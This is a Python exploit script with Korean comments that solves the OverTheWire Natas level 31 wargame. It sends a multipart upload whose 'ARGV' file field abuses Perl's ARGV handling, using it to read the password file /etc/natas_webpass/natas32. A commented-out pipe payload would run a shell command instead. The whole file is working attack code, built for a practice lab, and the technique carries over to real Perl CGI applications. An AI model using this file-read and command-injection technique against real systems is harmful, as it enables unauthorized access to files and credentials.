import requests
import sys
import re


boundary = "=" * 65

if len(sys.argv) != 2:
  print(boundary)
  print("[-] 실행 시, 아래 포멧을 지키세요")
  print(f"    python {sys.argv[0]} [natas31 비밀번호]")
  print(boundary)
  sys.exit()
  

url = "http://natas31.natas.labs.overthewire.org/index.pl"
natas31_cred = sys.argv[1]

s = requests.Session()
s.auth = ("natas31", natas31_cred)

#정상 파일을 올려서 if 조건을 통과하고 실제 파일에는 파일명 없어 ARGV 매직을 불러서 원하는 파일을 불러오도록 함
exploit_files = [
  ("file", (None, "ARGV")),
  ("file", ("text.csv", "abc"))
]

# url에서 LFI를 하기 위해서 해당 natas32 파일을 쿼리스트링으로 사용
payload = "/etc/natas_webpass/natas32"
#payload = "cat /etc/natas_webpass/natas32 |"
response = s.post(url, params=payload, files=exploit_files)  

# 익스플로잇 요청 및 응답 확인용 
print(boundary)  
print("[*] 익스플로잇 요청")
print(f"   요청 페이로드: {payload}")
print(f"   익스플로잇용 파일 ===> 파일명: {exploit_files[0][1][0]} 파일내용: {exploit_files[0][1][1]} ")
print(f"   요청 전체 url: {response.url}")
print(boundary)

password = re.search(r"[a-zA-Z0-9]{32}", response.text)

if password:  
  print(f"natas32 비밀번호 ===> {password.group(0)}")
  print(boundary)
else:
  print("페이로드 확인, 전체 응답 내용 확인")
  print(response.text)
  print(boundary)
